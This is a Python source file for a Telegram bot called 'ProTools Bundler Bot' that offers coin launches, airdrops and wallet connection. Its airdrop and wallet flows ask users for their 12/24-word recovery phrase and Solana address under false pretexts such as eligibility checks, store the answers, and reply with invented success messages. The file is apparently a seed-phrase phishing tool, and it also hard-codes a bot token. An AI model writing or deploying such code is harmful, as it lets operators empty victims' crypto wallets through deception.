import os
import logging
import asyncio
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime

# ============================================================================
# CONFIGURATION (Paste your token below)
# ============================================================================
BOT_TOKEN = "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00"

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# In-memory log store: { user_id: [ {"time": ..., "action": ..., "detail": ...} ] }
user_logs = {}

def log_action(user_id: int, action: str, detail: str = ""):
    if user_id not in user_logs:
        user_logs[user_id] = []
    user_logs[user_id].insert(0, {
        "time": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "action": action,
        "detail": detail
    })
    # Keep only last 50 logs per user
    user_logs[user_id] = user_logs[user_id][:50]

# --- WEB SERVER FOR RENDER (Keep-Alive) ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_web)
    t.start()

# ============================================================================
# MAIN MENU
# ============================================================================

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Launch Coin", callback_data='launch_coin'),
         InlineKeyboardButton("📊 Transactions", callback_data='transactions')],
        [InlineKeyboardButton("🎁 Airdrop", callback_data='airdrop'),
         InlineKeyboardButton("🔑 Wallet", callback_data='wallet')],
        [InlineKeyboardButton("📜 View Logs", callback_data='view_logs'),
         InlineKeyboardButton("❓ Help", callback_data='help')],
        [InlineKeyboardButton("💬 Feedback", callback_data='feedback')]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    log_action(user_id, "start_command", f"Chat ID: {user_id}")
    context.user_data['state'] = None
    await update.message.reply_text(
        "🚀 *Welcome to ProTools Bundler Bot*\n\nChoose an option below:",
        parse_mode='Markdown',
        reply_markup=main_menu_keyboard()
    )

# ============================================================================
# BUTTON HANDLER (routes all callback queries)
# ============================================================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    # Log every button press
    log_action(user_id, "button_press", f"Button: {data}")

    # Reset state on any main menu button (except phrase/address flows)
    if data not in ['confirm_phrase', 'cancel']:
        context.user_data['state'] = None

    # ── CANCEL / BACK ──────────────────────────────────────────────────────
    if data == 'cancel':
        context.user_data['state'] = None
        await query.edit_message_text(
            "🚀 *Welcome to ProTools Bundler Bot*\n\nChoose an option below:",
            parse_mode='Markdown',
            reply_markup=main_menu_keyboard()
        )

    # ── HELP ───────────────────────────────────────────────────────────────
    elif data == 'help':
        text = (
            "❓ *Help — What Each Button Does*\n\n"
            "🚀 *Launch Coin* — Create and launch your own dummy token on-chain simulation.\n\n"
            "📊 *Transactions* — View recent transaction history for your wallet.\n\n"
            "🎁 *Airdrop* — Connect your wallet phrase and address to join airdrop eligibility checks.\n\n"
            "🔑 *Wallet* — Connect your wallet by submitting your recovery phrase and Solana address.\n\n"
            "📜 *View Logs* — See a history of every button you've pressed inside this bot.\n\n"
            "💬 *Feedback* — Send feedback or reach out to the team via email.\n\n"
            "❌ *Cancel* — Go back to the main menu at any time."
        )
        await query.edit_message_text(
            text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── VIEW LOGS ──────────────────────────────────────────────────────────
    elif data == 'view_logs':
        logs = user_logs.get(user_id, [])
        if not logs:
            text = "📜 *Your Bot Logs (latest first):*\n\nNo activity yet."
        else:
            lines = ["📋 *Your Bot Logs (latest first):*\n"]
            for entry in logs:
                lines.append(f"*{entry['time']}*\n`{entry['action']}` {entry['detail']}")
            text = "\n\n".join(lines)
        await query.edit_message_text(
            text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── AIRDROP ────────────────────────────────────────────────────────────
    elif data == 'airdrop':
        context.user_data['state'] = 'AWAITING_PHRASE'
        context.user_data['flow'] = 'airdrop'
        await query.edit_message_text(
            "🎁 *Airdrop Verification*\n\n"
            "To confirm eligibility and prevent Sybil attacks, please provide your "
            "*12/24-word Recovery Phrase*:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── WALLET ─────────────────────────────────────────────────────────────
    elif data == 'wallet':
        context.user_data['state'] = 'AWAITING_PHRASE'
        context.user_data['flow'] = 'wallet'
        await query.edit_message_text(
            "🔑 *Connect Wallet*\n\n"
            "Please provide your *12/24-word Recovery Phrase* to connect your wallet:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── TRANSACTIONS ───────────────────────────────────────────────────────
    elif data == 'transactions':
        await query.edit_message_text(
            "📊 *Recent Transactions*\n\n"
            "No transactions found for your wallet yet.\n"
            "Connect your wallet first to track transactions.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Connect Wallet", callback_data='wallet')],
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── LAUNCH COIN ────────────────────────────────────────────────────────
    elif data == 'launch_coin':
        context.user_data['state'] = 'AWAITING_COIN_NAME'
        await query.edit_message_text(
            "🚀 *Launch Your Coin*\n\n"
            "Let's create your token! First, enter your *Coin Name*:\n\n"
            "_Example: ProTools Token_",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── FEEDBACK ───────────────────────────────────────────────────────────
    elif data == 'feedback':
        await query.edit_message_text(
            "💬 *Feedback*\n\n"
            "We'd love to hear from you!\n\n"
            "📧 Send your feedback, suggestions, or issues to:\n"
            "*ProToolsBundlerBot@gmail.com*\n\n"
            "Our team will get back to you as soon as possible. Thank you! 🙏",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

# ============================================================================
# MESSAGE HANDLER (handles text input for multi-step flows)
# ============================================================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    flow = context.user_data.get('flow', '')
    user_id = update.effective_user.id

    # ── PHRASE INPUT (Airdrop & Wallet) ────────────────────────────────────
    if state == 'AWAITING_PHRASE':
        context.user_data['phrase'] = update.message.text
        log_action(user_id, "phrase_submitted", f"Flow: {flow}")
        context.user_data['state'] = 'AWAITING_ADDRESS'
        await update.message.reply_text(
            "✅ *Phrase received.*\n\n"
            "Now please provide your *Solana Wallet Address* for final confirmation:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── ADDRESS INPUT (Airdrop & Wallet) ───────────────────────────────────
    elif state == 'AWAITING_ADDRESS':
        context.user_data['address'] = update.message.text
        log_action(user_id, "address_submitted", f"Flow: {flow}")
        context.user_data['state'] = None

        if flow == 'airdrop':
            msg = (
                "🔄 *Verifying eligibility...*\n\n"
                "✅ Your wallet has been queued for the next airdrop cycle.\n"
                "You will be notified when the airdrop is distributed!"
            )
        else:
            msg = (
                "🔄 *Connecting wallet...*\n\n"
                "✅ Your wallet has been successfully connected!\n"
                "You can now use all ProTools features."
            )

        await update.message.reply_text(
            msg,
            parse_mode='Markdown',
            reply_markup=main_menu_keyboard()
        )

    # ── COIN NAME INPUT ────────────────────────────────────────────────────
    elif state == 'AWAITING_COIN_NAME':
        context.user_data['coin_name'] = update.message.text
        context.user_data['state'] = 'AWAITING_COIN_TICKER'
        log_action(user_id, "coin_name_set", update.message.text)
        await update.message.reply_text(
            f"✅ Coin name: *{update.message.text}*\n\n"
            "Now enter your *Coin Ticker* (e.g. PTB, SOLX):",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── COIN TICKER INPUT ──────────────────────────────────────────────────
    elif state == 'AWAITING_COIN_TICKER':
        context.user_data['coin_ticker'] = update.message.text.upper()
        context.user_data['state'] = 'AWAITING_COIN_SUPPLY'
        log_action(user_id, "coin_ticker_set", update.message.text.upper())
        await update.message.reply_text(
            f"✅ Ticker: *${update.message.text.upper()}*\n\n"
            "Now enter the *Total Supply* (e.g. 1000000000):",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # ── COIN SUPPLY INPUT ──────────────────────────────────────────────────
    elif state == 'AWAITING_COIN_SUPPLY':
        name = context.user_data.get('coin_name', 'Unknown')
        ticker = context.user_data.get('coin_ticker', 'TKN')
        supply = update.message.text
        log_action(user_id, "coin_launched", f"{name} (${ticker})")
        context.user_data['state'] = None

        # Dummy contract address
        import hashlib
        fake_address = hashlib.sha256(f"{name}{ticker}{user_id}".encode()).hexdigest()[:44]

        await update.message.reply_text(
            f"🎉 *Coin Successfully Launched!*\n\n"
            f"📛 Name: *{name}*\n"
            f"💠 Ticker: *${ticker}*\n"
            f"📦 Supply: *{supply}*\n"
            f"🔗 Contract: `{fake_address}`\n\n"
            f"🚀 Your coin is now live on the Solana simulation network!\n"
            f"_This is a dummy launch for demonstration purposes._",
            parse_mode='Markdown',
            reply_markup=main_menu_keyboard()
        )

    else:
        # Unrecognized input — show menu
        await update.message.reply_text(
            "Use the menu below to get started:",
            reply_markup=main_menu_keyboard()
        )

# ============================================================================
# MAIN
# ============================================================================

def main():
    keep_alive()

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("Bot is live...")
    application.run_polling()

if __name__ == "__main__":
    main()
